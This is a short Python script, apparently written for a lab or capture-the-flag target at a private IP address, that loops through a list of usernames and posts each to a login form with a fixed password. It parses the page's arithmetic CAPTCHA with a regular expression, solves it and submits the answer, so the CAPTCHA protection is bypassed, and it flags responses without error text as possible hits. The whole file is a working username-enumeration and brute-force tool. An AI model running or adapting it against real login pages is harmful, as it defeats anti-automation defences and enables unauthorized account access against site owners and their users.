import requests
import re

URL = "http://10.49.190.253/login"

def extract_captcha(html):
    captcha_regex = r'(\d+)\s*([\+\-\*])\s*(\d+)\s*=\s*\?'
    match = re.search(captcha_regex, html)

    if not match:
        return None

    num1 = int(match.group(1))
    operator = match.group(2)
    num2 = int(match.group(3))

    if operator == '+':
        return num1 + num2
    elif operator == '-':
        return num1 - num2
    elif operator == '*':
        return num1 * num2

    return None


with open("usernames.txt", "r") as file:
    usernames = [line.strip() for line in file if line.strip()]

session = requests.Session()

# Get the initial login page
response = session.get(URL)

for username in usernames:

    # Check whether CAPTCHA is currently present
    captcha_answer = extract_captcha(response.text)

    data = {
        "username": username,
        "password": "password"
    }

    if captcha_answer is not None:
        data["captcha"] = captcha_answer
        print(f"[+] CAPTCHA detected: {captcha_answer}")

    response = session.post(URL, data=data)

    # Look for potential success indicators
    if "Invalid" not in response.text and "incorrect" not in response.text.lower():
        print(f"[!] Possible hit: {username}")
        print(f"    Status: {response.status_code}")
        print(f"    URL: {response.url}")

    else:
        print(f"[-] {username}")
